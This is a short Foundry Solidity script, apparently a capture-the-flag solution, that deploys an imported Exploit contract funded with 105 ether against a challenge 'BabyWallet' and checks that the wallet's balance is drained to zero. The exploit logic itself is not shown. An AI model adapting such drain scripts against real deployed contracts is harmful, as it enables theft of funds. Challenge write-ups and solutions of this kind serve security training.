// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {BabyWallet} from "../src/BabyWallet.sol";
import {Setup} from "../src/Setup.sol";
import {Exploit} from "./Exploit.sol";

contract BabyWalletScript is Script {
    // Test if working when simualating
    function RunExploit(address _chall) payable public {
        vm.startBroadcast();
        BabyWallet wallet = Setup(_chall).wallet();
        Exploit exp = new Exploit{value: 105 ether}(wallet);
        console.log(address(exp));
        console.log(address(this));
        console.log("Old balance: %d", address(exp).balance);
        exp.Run();
        require(wallet.balances(address(wallet)) == 0, "Attack failed");
        console.log("New balance: %d", address(exp).balance);
        vm.stopBroadcast();
    }
}
